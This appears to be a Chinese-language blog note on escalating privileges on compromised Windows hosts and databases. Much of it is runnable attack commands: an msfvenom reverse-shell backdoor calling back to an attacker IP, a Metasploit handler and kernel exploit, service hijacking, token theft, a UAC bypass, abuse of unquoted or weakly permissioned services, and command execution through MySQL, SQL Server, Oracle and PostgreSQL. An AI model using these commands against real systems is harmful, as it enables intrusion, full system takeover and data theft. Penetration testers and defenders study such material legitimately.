---
title: 利用已知漏洞进行Windows提权操作
date: 2026-02-26
updated: 2026-02-26
tags:
  - 安全基础
categories:
  - 安全相关
description: 利用已知漏洞进行Windows提权操作
---
土豆家族提权 https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w

## msf 提权基本使用流程

后门被执行，msf 监听得到基于当前反弹 shell 的 Session，搜索当前系统存在的内核可提权漏洞，以及对应可用 exp 从而利用当前获取的 Session 来提权。

```bash
# 生成反弹后门
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.181.143 LPORT=3333 -f exe -o msf.exe

# 配置监听会话
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 3333
exploit

# 筛选exp模块（自动化的快速识别系统中可能被利用的漏洞）
use post/multi/recon/local_exploir_suggester
set showdescription true

# 利用exp溢出提权
background
use exploit/windows/local/ms16_075_reflection_juicy
sessions
set session 1
exploit
```

当前受控机器在内网域环境下可能需要进行的下一步操作：

1. 提权到 system 与内网其他主机进行交互
2. 降权到域用户与内网其他主机进行交互

### 依靠服务提权

依靠服务将低权限提升为 System/Administrator 权限，创建服务，服务再创建程序，服务权限较高。

`sc` Windows 服务控制管理命令（适用于 windows 7、10、08、12、16、19、22，早期用 `at` 命令）

```powershell
# 创建一个名叫syscmd的执行文件服务
sc Create syscmd binPath="c:\msf.exe"
# 运行服务
sc start syscmd
```

### PsTools 工具提权

```powershell
# PsTools微软官方提供的系统排查工具
# 以系统最高权限（SYSTEM），在当前用户的桌面会话中，后台启动一个命令提示符（cmd），并且自动同意许可协议。
psexec.exe -accepteula -s -i -d cmd
# -accepteula不再询问是否同意 -s伪装为操作系统本身 -i将运行窗口展示出来 -d启动后直接返回
```

### 进程注入&令牌窃取

这两种本身不直接创造高权限，而是通过窃取或借用已存在的高权限

进程注入，核心通过寄生与伪装来提权

```powershell
# MSF或CS进行进程注入
ps	# 查看进程
migrate PID	# msf	将当前shell从原进程中拔出来强行塞进高权限进程PID的内存空间里运行
inject PID	# cs	将恶意代码写入指定PID进程内存中，并强行执行
```

令牌窃取，核心是通过盗用身份来进行提权

```powershell
# MSF或CS进行令牌窃取

# MSF
use incognito	# 加载一个专门用来玩弄令牌的插件
list_tokens -u	# 列出当前系统所有可用的令牌，Windows 为了效率，会把很多用户的令牌缓存在内存里。通常会发现列表里有 NT AUTHORITY\SYSTEM
impersonate_token "NT AUTHORITY\SYSTEM"	# 调用WindowsAPI，将当前shell身份切换为SYSTEM

# CS
ps
steal_token PID # 窃取进程令牌
spawnu PID # 窃取进程令牌上线
```

### Bypass UAC

User Account Control，用户账户控制

在运行部分程序时会弹窗提示用户确认执行当前软件，这里需要在不弹窗的情况下自动完成提权

核心是通过利用白名单的信任链，微软为了系统自身管理的便利，预置了一些系统自带的高权限程序（如 `eventvwr.exe` 事件查看器、`fodhelper.exe` 磁盘清理辅助等）这些程序 UAC 默认信任直接方行。

这些程序在运行过程中会读取注册表、调用子程序或加载 DLL，若可以篡改它们读取的配置，让其执行攻击代码则会成功提权。（寄生在白名单上）

利用工具 [UACME](https://github.com/hfiref0x/UACME) 根据系统版本自动选择有效绕过方法，它会修改特定注册表的剪枝，将默认执行的命令指向创建的后门程序，然后 UACME 启动那个受信任的系统程序。

```powershell
# Akagi64.exe <Method_ID> <Path_To_Executable>
Akagi64.exe 28 C:\Users\Public\msf.exe
# 28号绕过方法（具体随版本变化）
```

MSF 和 PowerShell 里面也都内置了 bypassuac

### DLL 劫持

> 根据下面的顺序进行搜索：
> 1. 应用程序加载的目录
> 2. C:\Windows\System32
> 3. C:\Windows\System
> 4. C:\Windows
> 5. 当前工作目录 Current Working Directory，CWD
> 6. 在 PATH 环境变量的目录（先系统后用户）

Windows 程序启动的时候需要 dll，若这些 dll 不存在，则可通过应用程序要查找位置防止恶意 dll 来提权。

关键在于目标是否是 exe 程序，该程序加载需要哪些 dll，这些 dll 是否可以操作

### 不带引号的服务

带有空格的目录，服务执行时不带引号，但是该服务的路径存在有空格的目录，会导致执行时系统将空格后的内容当做参数。

将后门文件放在空格前的目录，并命名为空格前的目录名，当启动该服务的时候就会导致执行该后门。

```PowerShell
# 利用Windows管理命令行工具筛选服务目标
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
# 获取每个服务的关键信息，服务内部名称、显示名称、服务对应的程序路径、启动模式，只查看自启动的，排除系统自带的（自带服务通常受保护，很难被修改）

# C:\Program Files\My App\service.exe	原服务执行程序路径
# 构造后门程序Program.exe放在C:\Program.exe下，或My.exe

sc start "xxx"	# 启动服务
```

### 不安全的服务权限

搜索是否能控制一些服务，由于管理配置错误，用户可能对服务拥有过多的权限，例如：若当前用户可以控制对应高权限的服务，修改当前服务所指向的执行文件，从而使脚本执行。

```PowerShell
# accesschk微软官方软件
accesschk.exe -uwcqv "administrator" *	# 检查文件、注册表、服务等对象的安全描述符
# u显示详细ACL信息，w筛选当前用户，c检查服务，q安静模式，c详细输出 *所有服务
sc config "VulnerableSvc" binpath= "C:\Users\Public\backdoor.exe"	# 搜索到vul...拥有RW SERVICE_ALL_ACCESS权限，作为突破口修改指定的启动文件
sc start "VulnerableSvc"
```

自动化项目（自动扫描系统中上百种提权点）

```PowerShell
# 支持多种操作系统及启动方式
winPEAS.bat > result.txt
winPEASany.exe log=result.txt
```

## 应用程序提权

除数据库之外包括当前主机安装的一些软件的漏洞，eg：sunlogin 向日葵远程代码执行漏洞等

### 利用数据库进行提权

需要获取到数据库的用户和密码，例如通过网站存在 SQL 注入漏洞，成功 getshell 后查看数据库的存储文件、备份文件，网站应用源码中的数据库配置文件，或采用工具或脚本进行爆破（可能需要先解决数据库外连的问题）

解决外连的方法：
- 利用已有 web 权限建立代理进行外连
- 执行 SQL 让数据库支持外连

MySQL

mysql 数据库中的 user 表，这里表示 root 用户只允许 localhost 连接，localhost 处改为 `*` 则为任意

![[attachments/20260304.png]]

```mysql
GRANT ALL PRIVILEGES ON *.* TO '帐号'@'%' IDENTIFIED BY '密码' WITH GRANT OPTION;

flush privileges;
```

SQLserver

```SQLserver
-- 修改服务器配置存储过程
EXEC sp_configure 'show advanced options', 1;	-- 开启“高级选项”
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;	-- 开启“即席分布式查询”
RECONFIGURE;
```

Oracle

```Oracle
ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;
SHUTDOWN IMMEDIATE;
STARTUP;
```

> 注：重启数据库对业务存在较高危害，并且以上操作也是要较高数据库权限的用户才能执行的

#### MySQL

需要有 root 的数据库密码，若是 php 站，高版本需要 `secure_file_priv` 参数没有进行目录限制，能够写入正确的 plugin 目录

UDF 提权，用户自定义函数提权：通过编写调用系统命令的共享库文件（Windows 为 `.dll`，Linux 为 `.so`），将其导入到 MySQL 的 plugin 目录，然后创建指向该共享库的自定义函数。本质是利用 MySQL 的 UDF 机制，通过加载恶意动态库来执行系统命令，从而突破数据库沙箱限制，获取更高系统权限。

MOF 提权，托管对象格式提权：利用 Windows 系统中 `C:/windows/system32/wbem/mof/` 目录下的 mof 文件会被系统定期（每隔 5 秒或每分钟）自动执行的特性。通过 MySQL 将恶意的 mof 文件写入该目录，mof 文件中包含 VBS 脚本，系统执行后就会以 SYSTEM 权限运行命令。需要将文件写入到 `%SystemRoot%\System32\Wbem\MOF` 目录。

启动项提权：通过 MySQL 将一段 VBS 脚本写入到系统的启动项目录下（如 `C:\Documents and Settings\All Users\「开始」菜单\程序\启动`）。当管理员重启服务器时，该脚本会被自动调用执行，从而获得系统权限。

- 需要知道启动项路径且有写入权限
- 必须等待或触发服务器重启
- 脚本中的命令需要有足够权限执行

反弹 shell：本质上仍属于 UDF 提权的一种，只是应用场景不同，在 MySQL 自定义函数中实现反弹 Shell 功能，让目标服务器主动连接攻击者的监听端口。当获得了 MySQL 的 root 密码且数据库可以外连，但没有 webshell 或 webshell 权限不足的情况

#### SQLserver

需要有 sa 密码（SQLserver 最高权限账户）

xp_cmdshell：一个存储过程，允许在 SQL 查询中直接执行 Windows 命令（默认关闭），执行命令 `exec xp_cmdshell 'whoami'`。

sp_oacreate：一个用于创建 OLE 自动化对象的存储过程，允许 SQL Server 调用 Windows 的 COM 组件。通过它创建一个 `WScript.Shell` 对象（类似 Windows 脚本宿主），利用这个对象执行命令。

CLR：CLR 集成允许在 SQL Server 内部运行 .NET 代码。攻击者编写一个包含恶意功能的 .NET 程序集（比如执行命令、反弹 Shell）；通过 `sa` 权限将这个程序集导入到数据库中；在数据库里调用这个程序集的功能。

#### Oracle

Java Stored Procedures（Java 存储过程）：Oracle 内部内置了一个 Java 虚拟机（JVM）。攻击者可以利用 `DBMS_JAVA` 包，在数据库里编写并运行 Java 代码。

```Oracle
-- 创建 Java 类，调用系统命令
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Util" AS
import java.io.*;
public class Util {
    public static String runCommand(String cmd) {
        // 执行命令的逻辑
    }
};
/
-- 创建包装函数
CREATE OR REPLACE FUNCTION run_cmd(cmd IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'Util.runCommand(java.lang.String) return java.lang.String';
/
-- 执行
SELECT run_cmd('whoami') FROM DUAL;
```

External Procedures（外部过程 extproc）：调用外部的 C 语言动态库（类似 MySQL 的 UDF）。通过配置监听器（Listener）和 `extproc` 服务，数据库可以加载外部的 `.dll` 或 `.so` 文件。

DBMS_SCHEDULER / DBMS_JOB（任务调度）：内置的任务调度系统，用于定期执行维护任务。若权限控制不当，可以创建一个“作业（Job）”，让数据库在特定时间执行操作系统脚本。

#### PostgreSQL

CVE-2019-9193：在 PostgreSQL 9.3 到 11.2 版本中，`COPY` 命令有一个功能叫 `FROM PROGRAM`，允许数据库直接运行系统命令并把结果存入表格。默认开启，且普通数据库权限就可以。

```PostGRESQL
-- 1. 清理现场：如果之前有过这张表，先删掉，防止报错
DROP TABLE IF EXISTS cmd_exec;

-- 2. 准备容器：创建一张新表，用来存放命令执行的结果
CREATE TABLE cmd_exec(cmd_output text);

-- 3. 执行命令：
COPY cmd_exec FROM PROGRAM 'id';

-- 4. 查看结果
SELECT * FROM cmd_exec;
```

#### Redis

写秘钥 ssh 计划任务，反弹 shell

#### Memcached

key-value 缓存系统，由于它本身没有权限控制模块，服务被攻击者扫描发现，通过命令交互可直接读取 memcache 中的敏感信息

https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg

